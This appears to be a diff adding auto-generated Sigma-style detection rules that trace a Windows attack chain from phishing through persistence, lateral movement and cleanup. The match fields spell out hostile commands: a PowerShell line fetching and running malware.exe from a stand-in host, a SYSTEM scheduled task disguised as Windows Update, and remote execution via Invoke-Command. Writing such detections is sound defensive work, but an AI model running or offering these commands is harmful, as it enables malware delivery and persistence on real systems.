@@ -1,0 +1,108 @@
+```yaml
+- title: Identify Initial Access via Spearphishing Email
+  id: 123e4567-e89b-12d3-a456-426614174000
+  description: Monitor for the creation of processes related to Outlook that involve email interactions, specifically looking for emails with attachments named "invoice.docx".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+      dstNode.Type: "File"
+      dstNode.Name: "invoice.docx"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1566
+    - tactic: Initial Access
+  level: high
+---
+- title: Identify Execution of Malicious Payload
+  id: 123e4567-e89b-12d3-a456-426614174001
+  description: Monitor for PowerShell execution that includes suspicious command-line arguments, particularly those involving Invoke-WebRequest or IEX.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      srcNode.Cmdline: '-ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri \'http://malicious.com/malware.exe\' -OutFile \'C:\\Users\\Public\\malware.exe\'; Start-Process \'C:\\Users\\Public\\malware.exe\'"'
+      dstNode.Type: "File"
+      dstNode.Name: "malware.exe"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1059
+    - tactic: Execution
+  level: high
+---
+- title: Identify Establishing Persistence via Scheduled Task
+  id: 123e4567-e89b-12d3-a456-426614174002
+  description: Monitor for the creation of scheduled tasks using schtasks.exe with parameters that create tasks mimicking legitimate system tasks.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\schtasks.exe"
+      srcNode.Cmdline: '/create /tn "Windows Update Service" /tr "C:\\Users\\Public\\malware.exe" /sc ONLOGON /ru "SYSTEM"'
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - ATT&CK ID: T1053
+    - tactic: Persistence
+  level: medium
+---
+- title: Identify Lateral Movement and Further Exploitation
+  id: 123e4567-e89b-12d3-a456-426614174003
+  description: Monitor for unusual RDP connections initiated by the SYSTEM account and the creation of additional scheduled tasks on other machines.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      srcNode.Cmdline: 'Invoke-Command -ComputerName "RemotePC" -ScriptBlock { Start-Process "C:\\Users\\Public\\malware.exe" }'
+      dstNode.Type: "Process"
+      dstNode.Image: "C:\\Users\\Public\\malware.exe"
+  condition: selection
+  tags:
+    - ATT&CK ID: T1021
+    - tactic: Lateral Movement
+  level: high
+---
+- title: Identify Cleanup and Evasion Techniques
+  id: 123e4567-e89b-12d3-a456-426614174004
+  description: Monitor for modifications or deletions of scheduled tasks using schtasks.exe that may indicate attempts to hide malicious activity.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\schtasks.exe"
+      srcNode.Cmdline: '/delete /tn "Windows Update Service" /f'
+      dstNode.Type: null
+  condition: selection
+  tags:
+    - ATT&CK ID: T1070
+    - tactic: Defense Evasion
+  level: medium
+```
